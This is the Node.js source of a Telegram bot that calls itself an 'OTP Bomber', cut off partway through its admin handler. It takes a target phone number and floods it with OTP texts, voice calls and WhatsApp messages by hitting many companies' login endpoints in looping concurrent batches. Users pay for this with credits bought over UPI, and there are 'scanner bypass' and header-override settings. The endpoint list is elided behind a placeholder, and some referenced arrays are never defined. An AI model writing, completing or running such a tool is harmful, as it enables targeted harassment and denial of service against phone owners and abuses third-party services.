// bot.js – Complete Node.js OTP Bomber with ALL Python features (OPTIMIZED)
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { BOT_TOKEN, ADMIN_IDS } = require('./config');
const db = require('./database');

// ===== MEMORY MANAGEMENT =====
const MEMORY_LIMIT = 400; // MB - Warning threshold
let lastGCTime = Date.now();

function checkMemory() {
    const now = Date.now();
    if (now - lastGCTime < 30000) return; // Check every 30 seconds
    lastGCTime = now;
    
    const used = process.memoryUsage().heapUsed / 1024 / 1024;
    const total = process.memoryUsage().heapTotal / 1024 / 1024;
    const rss = process.memoryUsage().rss / 1024 / 1024;
    
    console.log(`📊 Memory: Heap ${used.toFixed(1)}MB/${total.toFixed(1)}MB, RSS ${rss.toFixed(1)}MB`);
    
    if (used > MEMORY_LIMIT) {
        console.log(`⚠️ Memory high (${used.toFixed(1)}MB), running GC...`);
        if (global.gc) {
            global.gc();
            const newUsed = process.memoryUsage().heapUsed / 1024 / 1024;
            console.log(`✅ GC done, now ${newUsed.toFixed(1)}MB`);
        }
    }
}

// ===== ERROR HANDLING TO PREVENT CRASH =====
process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err.message);
    console.error('Stack:', err.stack);
    // Don't exit - keep bot running
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise);
    console.error('Reason:', reason);
    // Don't exit - keep bot running
});

// Catch EFATAL errors specifically
const originalEmit = process.emit;
process.emit = function(event, error) {
    if (event === 'uncaughtException') {
        if (error && error.code === 'EFATAL') {
            console.error('⚠️ EFATAL error caught and ignored:', error.message);
            return true;
        }
        if (error && error.message && error.message.includes('request-promise')) {
            console.error('⚠️ Request error caught:', error.message);
            return true;
        }
        if (error && error.message && error.message.includes('ECONNRESET')) {
            console.error('⚠️ Connection reset error caught:', error.message);
            return true;
        }
        if (error && error.message && error.message.includes('ETIMEDOUT')) {
            console.error('⚠️ Timeout error caught:', error.message);
            return true;
        }
    }
    return originalEmit.apply(this, arguments);
};

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ---------- BOMBING STATUS ----------
const bombingStatus = new Map();

// ---------- USER STATES ----------
const userStates = new Map();
const pendingPayments = new Map();
const adminStates = new Map();

// ---------- SMART BROADCAST STATE ----------
const adminBroadcastState = new Map();

// ===== OPTIMIZATION: REDUCED CONCURRENCY =====
const BATCH_SIZE = 25;        // APIs per batch (was 200)
const BATCH_DELAY = 15;       // ms between batches
const MAX_RETRIES = 2;        // Retry failed APIs
const API_TIMEOUT = 2500;     // ms (was 2000)

// ---------- FULL API CONFIGURATION ----------
const API_CONFIGS = [
    // [All your existing API configs - SAME as before]
    // ... (keeping all APIs unchanged)
];

// ===== MERGE ALL APIS WITH DEDUPLICATION =====
const allApis = [...API_CONFIGS, ...VOICE_APIS, ...WHATSAPP_APIS, ...EXTRA_APIS];

// Deduplicate by URL
const seenUrls = new Set();
const uniqueApis = [];
for (const api of allApis) {
    const urlKey = typeof api.url === 'function' ? `dynamic_${api.name || 'unknown'}` : api.url;
    if (!seenUrls.has(urlKey)) {
        seenUrls.add(urlKey);
        uniqueApis.push(api);
    }
}

// Ensure all APIs have required fields
for (const api of uniqueApis) {
    if (!api.name) api.name = `api_${uniqueApis.indexOf(api)}`;
    if (!api.data) api.data = null;
}

console.log(`✅ Loaded ${uniqueApis.length} unique APIs`);

// ---------- FALLBACK DATA GENERATOR ----------
function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) {
        if (lower.includes('tata')) {
            return JSON.stringify({ phone, isOtpViaCallAtLogin: "true" });
        } else if (lower.includes('1mg')) {
            return JSON.stringify({ number: phone, otp_on_call: true });
        } else if (lower.includes('swiggy')) {
            return JSON.stringify({ mobile: phone });
        } else if (lower.includes('flipkart')) {
            return `phone=${phone}&action=voice_otp`;
        } else if (lower.includes('amazon')) {
            return `phone=${phone}&action=voice_otp`;
        } else if (lower.includes('paytm')) {
            return JSON.stringify({ phone });
        } else if (lower.includes('uber')) {
            return JSON.stringify({ phone: `+91${phone}` });
        } else {
            return JSON.stringify({ mobile: phone });
        }
    }
    if (lower.includes('whatsapp')) {
        if (lower.includes('kpn')) {
            return JSON.stringify({
                notification_channel: "WHATSAPP",
                phone_number: { country_code: "+91", number: phone }
            });
        } else if (lower.includes('foxy')) {
            return JSON.stringify({
                user: { phone_number: `+91${phone}` },
                via: "whatsapp"
            });
        } else {
            return JSON.stringify({ mobile: phone, channel: "whatsapp" });
        }
    }
    return JSON.stringify({ mobile: phone });
}

// ---------- BOMBING ENGINE (OPTIMIZED) ----------
async function makeApiCall(api, phone, retryCount = 0) {
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        
        // Remove problematic headers
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') {
                data = api.data(phone);
            } else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') {
                    rawData = rawData.replace(/{phone}/g, phone);
                }
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) {
                            newObj[key] = replacePhone(obj[key]);
                        }
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = makeFallbackData(phone, api.name);
        }

        const method = api.method.toLowerCase();
        const config = {
            method,
            url,
            headers,
            timeout: API_TIMEOUT,
            transformRequest: [(d) => d],
        };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) {
                    headers['Content-Type'] = 'application/json';
                }
            }
        }

        const response = await axios(config);
        return { status: response.status, success: true };
    } catch (err) {
        // Retry on certain errors
        if (retryCount < MAX_RETRIES && 
            (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }
        return { status: null, success: false };
    }
}

// OPTIMIZED: Process APIs in batches
async function processApiBatch(apiBatch, phone) {
    const results = await Promise.allSettled(
        apiBatch.map(api => makeApiCall(api, phone))
    );
    
    let success = 0;
    let smsCount = 0, callCount = 0, whatsappCount = 0;
    
    for (let i = 0; i < results.length; i++) {
        const result = results[i];
        if (result.status === 'fulfilled' && result.value && result.value.success) {
            success++;
            const api = apiBatch[i];
            const name = api?.name || '';
            if (name.toLowerCase().includes('call') || name.toLowerCase().includes('voice')) {
                callCount++;
            } else if (name.toLowerCase().includes('whatsapp')) {
                whatsappCount++;
            } else {
                smsCount++;
            }
        }
    }
    
    return { success, smsCount, callCount, whatsappCount };
}

async function runBomber(chatId, phone, durationMinutes) {
    const protectedList = await db.getProtected();
    if (protectedList.includes(phone)) {
        bot.sendMessage(chatId, '⚠️ This number is PROTECTED by admin.\nBombing not allowed!');
        bombingStatus.set(chatId, false);
        return;
    }

    if (bombingStatus.get(chatId)) {
        bot.sendMessage(chatId, '❌ Bombing already active. Use /stop first.');
        return;
    }
    bombingStatus.set(chatId, true);

    const user = await db.getUser(chatId);
    const isUnlimited = user.daily_unlimited > Date.now() / 1000;

    if (!isUnlimited) {
        const cost = getBombCost(durationMinutes);
        if (!ADMIN_IDS.includes(Number(chatId)) && user.credits < cost) {
            bot.sendMessage(chatId, `❌ Insufficient credits! Need ${cost} credits for ${getDurationText(durationMinutes)}.`);
            bombingStatus.set(chatId, false);
            return;
        }
        await db.updateCredits(chatId, -cost);
    }

    user.total_attacks += 1;
    await user.save();

    const sessionId = `${Date.now()}_${phone}`;
    user.bomb_sessions.push({
        session_id: sessionId,
        phone,
        start_time: Date.now() / 1000,
        duration: durationMinutes,
        is_unlimited: isUnlimited,
    });
    await user.save();

    const durationText = getDurationText(durationMinutes);
    const msg = await bot.sendMessage(
        chatId,
        `⚔️ **BOMBING STARTED**\n📱 Target: \`${phone}\`\n⏱️ Duration: ${durationText}\n🔁 Looping continuously...\n${isUnlimited ? '⭐ UNLIMITED PLAN ACTIVE' : `💳 Cost: ${getBombCost(durationMinutes)} credits`}`,
        { parse_mode: 'Markdown' }
    );

    let smsCount = 0, callCount = 0, whatsappCount = 0, totalSent = 0;
    let lastUpdate = Date.now();
    const updateInterval = 1000; // Update every second
    const startTime = Date.now() / 1000;
    const endTime = startTime + (durationMinutes === 1440 ? 86400 : durationMinutes * 60);
    const apiList = uniqueApis;
    let cycleCount = 0;

    while (bombingStatus.get(chatId)) {
        if (!isUnlimited && Date.now() / 1000 >= endTime) break;
        
        // Check memory periodically
        checkMemory();

        // Process APIs in batches (OPTIMIZED)
        for (let i = 0; i < apiList.length; i += BATCH_SIZE) {
            if (!bombingStatus.get(chatId)) break;
            if (!isUnlimited && Date.now() / 1000 >= endTime) break;
            
            const batch = apiList.slice(i, i + BATCH_SIZE);
            const result = await processApiBatch(batch, phone);
            
            totalSent += result.success;
            smsCount += result.smsCount;
            callCount += result.callCount;
            whatsappCount += result.whatsappCount;
            
            // Small delay between batches to prevent rate limiting
            if (i + BATCH_SIZE < apiList.length) {
                await new Promise(r => setTimeout(r, BATCH_DELAY));
            }
        }
        
        cycleCount++;

        // Update progress (OPTIMIZED: less frequent updates)
        const now = Date.now();
        if (now - lastUpdate >= updateInterval) {
            lastUpdate = now;
            const timeLeft = isUnlimited ? '∞' : Math.floor(endTime - now / 1000);
            const timeLeftText = typeof timeLeft === 'number' ? `${Math.floor(timeLeft/60)}m ${timeLeft%60}s` : '∞';
            try {
                await bot.editMessageText(
                    `⚔️ **BOMBING IN PROGRESS**\n📱 Target: \`${phone}\`\n⏱️ Time Left: ${timeLeftText}\n📨 SMS: ${smsCount}\n📞 Calls: ${callCount}\n📱 WA: ${whatsappCount}\n💳 Credits: ${isUnlimited ? 'Unlimited' : user.credits}\n🔄 Cycles: ${cycleCount}\n\n🔴 Use /stop to halt`,
                    { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown' }
                );
            } catch (e) {}
        }

        // Small delay between cycles to prevent CPU overload
        await new Promise(r => setTimeout(r, 10));
    }

    bombingStatus.set(chatId, false);
    const finalStatus = bombingStatus.get(chatId) === false ? 'STOPPED' : 'COMPLETED';
    await bot.editMessageText(
        `✅ **BOMBING ${finalStatus}**\n📱 Target: \`${phone}\`\n📨 SMS: ${smsCount}\n📞 Calls: ${callCount}\n📱 WA: ${whatsappCount}\n💳 Credits remaining: ${isUnlimited ? 'Unlimited' : user.credits}\n🔄 Total Cycles: ${cycleCount}\n\n🟢 Use /bomb to start again`,
        { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown' }
    );

    const updatedUser = await db.getUser(chatId);
    const session = updatedUser.bomb_sessions.find(s => s.session_id === sessionId);
    if (session) {
        session.end_time = Date.now() / 1000;
        session.total_sent = totalSent;
        session.sms_count = smsCount;
        session.call_count = callCount;
        session.whatsapp_count = whatsappCount;
        session.status = finalStatus;
        session.cycles = cycleCount;
        await updatedUser.save();
    }
}

// UPDATED: Unlimited plan cost increased to 100 coins
function getBombCost(minutes) {
    if (minutes === 1440) return 100;  // ← CHANGED: 20 → 100
    if (minutes <= 0) return 0;
    if (minutes <= 10) return minutes;
    return 10;
}

function getDurationText(minutes) {
    if (minutes === 1440) return '1 Day (Unlimited)';
    if (minutes < 60) return `${minutes} Minute${minutes > 1 ? 's' : ''}`;
    const h = Math.floor(minutes / 60);
    const m = minutes % 60;
    if (m === 0) return `${h} Hour${h > 1 ? 's' : ''}`;
    return `${h} Hour${h > 1 ? 's' : ''} ${m} Minute${m > 1 ? 's' : ''}`;
}

// ---------- KEYBOARDS ----------
function mainKeyboard() {
    const day = new Date().getDate();
    const colors = ['🟢','🔵','🟡','🔴','🟣','🟠','🟤','⚫','⚪','🟢'];
    const color = colors[day % colors.length];
    return {
        reply_markup: {
            keyboard: [
                [`${color} START BOMB`, '🔴 STOP BOMB'],
                ['💰 MY CREDITS', '🎁 DAILY SPIN'],
                ['🎟️ REDEEM CODE', '👑 ADMIN PANEL'],
                ['📊 MY STATS', '❓ HELP'],
                ['💳 BUY CREDITS', '🔗 REFERRAL'],
                ['⚙️ SETTINGS']
            ],
            resize_keyboard: true
        }
    };
}

function adminKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['📊 STATS', '👥 USERS LIST'],
                ['🎟️ GEN CODE', '🚫 BAN USER'],
                ['✅ UNBAN USER', '💰 ADD CREDITS'],
                ['➕ ADD PROTECTED', '➖ REMOVE PROTECTED'],
                ['📋 PROTECTED LIST', '📢 BROADCAST'],
                ['📋 ALL USERS', '🔄 UNLIMITED PLAN'],
                ['📺 CHANNEL MANAGER', '🛡️ SCANNER MANAGER'],
                ['🔙 BACK']
            ],
            resize_keyboard: true
        }
    };
}

// ---------- CHANNEL BUTTONS ----------
async function getChannelButtons() {
    const channels = await db.getChannels();
    const buttons = channels.map(ch => {
        return [{ text: `✅ ${ch}`, url: `https://t.me/${ch.replace('@', '')}` }];
    });
    buttons.push([{ text: '🟢 I have joined all channels', callback_data: 'verify_join' }]);
    return { inline_keyboard: buttons };
}

// ---------- COMMAND HANDLERS ----------

// /start
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const args = msg.text.split(' ');
    const refCode = args.length > 1 ? args[1] : null;

    if (await db.isBanned(chatId)) {
        bot.sendMessage(chatId, '🚫 You are banned!');
        return;
    }

    const user = await db.getUser(chatId);
    user.username = msg.from.username || '';
    user.first_name = msg.from.first_name || '';
    await user.save();

    if (refCode) {
        user.pending_ref_code = refCode;
        await user.save();
    }

    const joined = await db.isJoined(chatId, bot);
    if (!joined) {
        const channels = await db.getChannels();
        if (channels.length > 0) {
            const keyboard = await getChannelButtons();
            bot.sendMessage(
                chatId,
                `🚫 **Please join our channel(s) first!**\n\nRequired channels:\n${channels.join('\n')}\n\nAfter joining all channels, click the green button below.`,
                { parse_mode: 'Markdown', reply_markup: keyboard }
            );
        } else {
            await showMainMenu(chatId);
        }
        return;
    }

    await showMainMenu(chatId);
});

async function showMainMenu(chatId) {
    const user = await db.getUser(chatId);
    if (user.pending_ref_code) {
        const result = await db.processReferral(chatId, user.pending_ref_code);
        bot.sendMessage(chatId, result.success ? `🎉 ${result.msg}` : `❌ ${result.msg}`);
        user.pending_ref_code = null;
        await user.save();
    }
    const code = await db.generateReferralCode(chatId);
    const botInfo = await bot.getMe();
    const welcome = `👋 Welcome!\n\n🔗 Your Referral Code: \`${code}\`\n📤 Share: \`https://t.me/${botInfo.username}?start=${code}\`\n\nUse the buttons below!`;
    bot.sendMessage(chatId, welcome, { parse_mode: 'Markdown', ...mainKeyboard() });
}

// ---------- CALLBACK QUERY HANDLER ----------
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    const msgId = callbackQuery.message.message_id;

    if (data === 'verify_join') {
        const joined = await db.isJoined(chatId, bot);
        if (joined) {
            bot.editMessageText('✅ You have joined all channels! Access granted.', { chat_id: chatId, message_id: msgId });
            await showMainMenu(chatId);
        } else {
            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ You still haven\'t joined all channels. Please join and try again.', show_alert: true });
        }
        return;
    }

    // Duration selection callback
    if (data.startsWith('dur_')) {
        const dur = parseInt(data.split('_')[1]);
        const state = userStates.get(chatId);
        if (state && state.phone) {
            const phone = state.phone;
            userStates.delete(chatId);
            await runBomber(chatId, phone, dur);
        } else {
            bot.sendMessage(chatId, '❌ Please enter phone number first.');
        }
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // Buy credits callback (UPDATED with new pricing)
    if (data.startsWith('buy_')) {
        const parts = data.split('_');
        const plan = parts[1];
        let credits = 0, amount = 0, description = '';
        if (plan === '10') { credits = 10; amount = 20; description = '10 Credits'; }
        else if (plan === '25') { credits = 25; amount = 40; description = '25 Credits'; }
        else if (plan === '50') { credits = 50; amount = 70; description = '50 Credits'; }
        else if (plan === '100') { credits = 100; amount = 120; description = '100 Credits'; }
        else if (plan === 'unlimited') { credits = 0; amount = 150; description = 'Unlimited 1 Day'; } // UPDATED: 50 → 150

        const payId = Math.random().toString(36).substring(2, 10);
        pendingPayments.set(chatId, { credits, amount, description, payId });
        bot.sendMessage(chatId, `💳 **Payment for ${description}**\n\nPlease send ₹${amount} to UPI: \`example@upi\`\n\nAfter payment, use: \`/verify ${payId}\``, { parse_mode: 'Markdown' });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // ===== SMART BROADCAST CALLBACKS =====
    if (data === 'smart_broadcast_start') {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
        }
        
        adminBroadcastState.set(chatId, { mode: 'broadcast', active: true });
        
        await bot.editMessageText(
            `📢 **SMART BROADCAST MODE ACTIVATED**\n\n` +
            `🎯 Send me ANY message and I'll forward it to ALL users!\n\n` +
            `✅ **Supported Types:**\n` +
            `• 📝 Text Messages\n` +
            `• 🖼️ Photos (with/without caption)\n` +
            `• 🎥 Videos (with/without caption)\n` +
            `• 📄 Documents (with/without caption)\n` +
            `• 🔊 Audio Files (with/without caption)\n` +
            `• 🎤 Voice Messages\n` +
            `• 🏷️ Stickers\n` +
            `• 🎬 GIFs/Animations\n` +
            `• 📊 Polls & Quizzes\n` +
            `• 📍 Location\n` +
            `• 📞 Contact\n` +
            `• 🎮 Game\n` +
            `• 📺 Video Notes\n` +
            `• 🎵 Music\n` +
            `• 📦 Any other media!\n\n` +
            `📊 **Real-time tracking:**\n` +
            `• Progress percentage\n` +
            `• Success/Failure count\n` +
            `• Time elapsed & remaining\n` +
            `• Success rate\n\n` +
            `⚠️ Send /cancel to exit broadcast mode`,
            { 
                chat_id: chatId, 
                message_id: msgId,
                parse_mode: 'Markdown' 
            }
        );
        
        bot.answerCallbackQuery(callbackQuery.id, { 
            text: '✅ Broadcast mode activated! Send any message now.',
            show_alert: true 
        });
        return;
    }
    
    if (data === 'smart_broadcast_stats') {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
        }
        
        const totalUsers = await db.User.countDocuments();
        const activeUsers = await db.User.countDocuments({ 
            last_active: { $gt: Date.now() - 3600000 } 
        });
        const bombingActive = bombingStatus.size;
        
        await bot.editMessageText(
            `📊 **BROADCAST STATISTICS**\n\n` +
            `👥 **Total Users:** ${totalUsers}\n` +
            `🟢 **Active Users (1h):** ${activeUsers}\n` +
            `💣 **Active Bombing:** ${bombingActive}\n` +
            `📡 **APIs Loaded:** ${uniqueApis.length}\n\n` +
            `📈 **Broadcast Status:**\n` +
            `• Last Broadcast: ${adminBroadcastState.get(chatId)?.last_broadcast || 'Never'}\n` +
            `• Users in Queue: ${adminBroadcastState.get(chatId)?.queue_count || 0}\n\n` +
            `🔁 Use /broadcast to send a new broadcast`,
            { 
                chat_id: chatId, 
                message_id: msgId,
                parse_mode: 'Markdown' 
            }
        );
        
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }
    
    if (data === 'smart_broadcast_cancel') {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
        }
        
        adminBroadcastState.delete(chatId);
        
        await bot.editMessageText(
            `❌ **Broadcast Cancelled**\n\n` +
            `Smart broadcast mode has been deactivated.\n` +
            `Use /broadcast to start a new broadcast.`,
            { 
                chat_id: chatId, 
                message_id: msgId,
                parse_mode: 'Markdown' 
            }
        );
        
        bot.answerCallbackQuery(callbackQuery.id, { 
            text: '❌ Broadcast cancelled',
            show_alert: true 
        });
        return;
    }

    // Channel manager callbacks
    if (data === 'channel_add') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        userStates.set(chatId, { state: 'add_channel' });
        bot.editMessageText('📺 Send channel username to add (e.g., @channelname):', { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }
    if (data === 'channel_remove') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        const channels = await db.getChannels();
        if (channels.length === 0) {
            bot.editMessageText('📭 No channels to remove.', { chat_id: chatId, message_id: msgId });
            return bot.answerCallbackQuery(callbackQuery.id);
        }
        userStates.set(chatId, { state: 'remove_channel' });
        let msg = '📺 **Current Channels:**\n' + channels.join('\n') + '\n\nSend channel username to remove:';
        bot.editMessageText(msg, { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }
    if (data === 'channel_view') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        const channels = await db.getChannels();
        const msg = channels.length ? `📺 **Required Channels:**\n${channels.join('\n')}` : '📭 No channels configured.';
        bot.editMessageText(msg, { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // Scanner manager callbacks
    if (data === 'scanner_add') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        userStates.set(chatId, { state: 'add_scanner' });
        bot.editMessageText('🛡️ Send scanner bypass data (JSON format or description):', { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }
    if (data === 'scanner_remove') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        const config = await db.getScannerConfig();
        if (config.scanners.length === 0) {
            bot.editMessageText('📭 No scanners configured.', { chat_id: chatId, message_id: msgId });
            return bot.answerCallbackQuery(callbackQuery.id);
        }
        let msg = '🛡️ **Current Scanners:**\n';
        config.scanners.forEach((s, i) => msg += `${i+1}. ${s.substring(0, 50)}...\n`);
        msg += '\nSend scanner number to remove:';
        userStates.set(chatId, { state: 'remove_scanner' });
        bot.editMessageText(msg, { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }
    if (data === 'scanner_view') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        const config = await db.getScannerConfig();
        const msg = config.scanners.length ? `🛡️ **Configured Scanners:**\n\n${config.scanners.map((s, i) => `${i+1}. ${s}`).join('\n')}` : '📭 No scanners configured.';
        bot.editMessageText(msg, { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }
    if (data === 'scanner_headers') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        userStates.set(chatId, { state: 'set_global_headers' });
        bot.editMessageText('🔄 Send global headers in JSON format:\n`{"header1": "value1", "header2": "value2"}`', 
            { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // Admin back
    if (data === 'admin_back') {
        bot.editMessageText('🔐 Admin Panel', { chat_id: chatId, message_id: msgId });
        bot.sendMessage(chatId, '🔐 Admin Panel', adminKeyboard());
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // Settings callbacks
    if (data === 'settings_view') {
        const user = await db.getUser(chatId);
        const msg = `📋 **Your Current Settings**\n\n🔍 Scanner: ${user.scanner_enabled ? '✅ Enabled' : '❌ Disabled'}\n🛡️ Custom Headers: ${Object.keys(user.custom_headers || {}).length} modified\n\n${Object.keys(user.custom_headers || {}).length > 0 ? '**Custom Headers:**\n' + Object.entries(user.custom_headers).map(([k, v]) => `\`${k}\`: \`${v}\``).join('\n') : 'No custom headers set.'}`;
        bot.editMessageText(msg, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }
    if (data === 'settings_add_scanner') {
        bot.editMessageText('🔍 **Scanner/Bypass Setup**\n\nPlease send a description or code for scanner bypass.', 
            { chat_id: chatId, message_id: msgId });
        userStates.set(chatId, { state: 'add_scanner_user' });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }
    if (data === 'settings_modify_headers') {
        bot.editMessageText('📝 **Modify Headers**\n\nSend header modifications in format:\n`header_name: header_value`\n\nSend /done when finished.', 
            { chat_id: chatId, message_id: msgId });
        userStates.set(chatId, { state: 'modify_headers', headers: {} });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // All users pagination
    if (data.startsWith('allusers_')) {
        const page = parseInt(data.split('_')[1]);
        const state = userStates.get(chatId);
        if (state && state.state === 'allusers') {
            const start = page * state.perPage;
            const end = start + state.perPage;
            const chunk = state.users.slice(start, end);
            let msg = '👥 **ALL USERS**\n\n';
            chunk.forEach(u => {
                msg += `🆔 \`${u._id}\` | @${u.username || 'no_username'} | 💰${u.credits}\n`;
            });
            msg += `\nPage ${page+1}/${state.totalPages}`;
            const markup = {
                inline_keyboard: [
                    ...(page > 0 ? [{ text: '◀️ Prev', callback_data: `allusers_${page-1}` }] : []),
                    ...(page < state.totalPages-1 ? [{ text: 'Next ▶️', callback_data: `allusers_${page+1}` }] : [])
                ]
            };
            bot.editMessageText(msg, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown', reply_markup: markup });
            state.page = page;
            userStates.set(chatId, state);
        }
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }
});

// ---------- /bomb ----------
bot.onText(/\/bomb/, async (msg) => {
    const chatId = msg.chat.id;
    if (await db.isBanned(chatId)) return bot.sendMessage(chatId, '🚫 You are banned!');

    if (!await db.isJoined(chatId, bot)) {
        const channels = await db.getChannels();
        return bot.sendMessage(chatId, `🚫 Join required channels first:\n${channels.join('\n')}`);
    }

    if (bombingStatus.get(chatId)) {
        return bot.sendMessage(chatId, '❌ You already have an active bombing session. Use /stop first.');
    }

    bot.sendMessage(chatId, '📱 Send the 10-digit phone number to bomb:');
    userStates.set(chatId, { state: 'enter_phone' });
});

// /stop
bot.onText(/\/stop/, async (msg) => {
    const chatId = msg.chat.id;
    if (bombingStatus.get(chatId)) {
        bombingStatus.set(chatId, false);
        bot.sendMessage(chatId, '⏹️ Bombing stopped.');
    } else {
        bot.sendMessage(chatId, '❌ No active bombing.');
    }
});

// /verify (payment)
bot.onText(/\/verify (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const payId = match[1];
    if (!pendingPayments.has(chatId)) return bot.sendMessage(chatId, '❌ No pending payment.');
    const payment = pendingPayments.get(chatId);
    if (payment.payId === payId) {
        if (payment.credits > 0) {
            await db.updateCredits(chatId, payment.credits);
            bot.sendMessage(chatId, `✅ Added ${payment.credits} credits!`);
        } else {
            const user = await db.getUser(chatId);
            user.daily_unlimited = Date.now() / 1000 + 86400;
            await user.save();
            bot.sendMessage(chatId, '✅ Unlimited plan activated for 24 hours!');
        }
        pendingPayments.delete(chatId);
    } else {
        bot.sendMessage(chatId, '❌ Invalid payment ID.');
    }
});

// ---------- MESSAGE HANDLER ----------
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text) return;

    if (await db.isBanned(chatId)) return bot.sendMessage(chatId, '🚫 You are banned!');

    const user = await db.getUser(chatId);

    // ===== SMART BROADCAST MESSAGE HANDLER =====
    if (adminBroadcastState.has(chatId) && ADMIN_IDS.includes(Number(chatId))) {
        const state = adminBroadcastState.get(chatId);
        if (state.active) {
            if (text === '/cancel' || text === 'Cancel' || text === '❌ Cancel') {
                adminBroadcastState.delete(chatId);
                return bot.sendMessage(chatId, '❌ Broadcast cancelled.');
            }
            await processSmartBroadcast(chatId, msg);
            return;
        }
    }

    // Admin Panel
    if (text === '👑 ADMIN PANEL') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.sendMessage(chatId, '❌ You are not an admin.');
        bot.sendMessage(chatId, '🔐 Admin Panel', adminKeyboard());
        return;
    }

    if (text === '🔙 BACK') {
        bot.sendMessage(chatId, '🔙 Back to main menu', mainKeyboard());
        return;
    }

    // Admin commands
    if (ADMIN_IDS.includes(Number(chatId))) {
        if (text === '📊 STATS') {
            const totalUsers = await db.User.countDocuments();
            const totalAttacks = (await db.User.aggregate([{ $group: { _id: null, total: { $sum: '$total_attacks' } } }]))[0]?.total || 0;
            const totalCredits = (await db.User.aggregate([{ $group: { _id: null, total: { $sum: '$credits' } } }]))[0]?.total || 0;
            const config = await db.getScannerConfig();
            const channels = await db.getChannels();
            bot.sendMessage(chatId, 
                `📊 **BOT STATS**\n👥 Users: ${totalUsers}\n💰 Total credits: ${totalCredits}\n⚔️ Attacks: ${totalAttacks}\n📡 APIs loaded: ${uniqueApis.length}\n📺 Channels: ${channels.length}\n🛡️ Scanners: ${config.scanners.length}`,
                { parse_mode: 'Markdown' }
            );
            return;
        }
        if (text === '👥 USERS LIST') {
            const users = await db.User.find().select('_id username credits total_attacks').limit(20);
            let list = '👥 Users (first 20):\n\n';
            users.forEach(u => {
                list += `🆔 ${u._id} | @${u.username || 'no_username'} | 💰${u.credits} | 💥${u.total_attacks}\n`;
            });
            bot.sendMessage(chatId, list);
            return;
        }
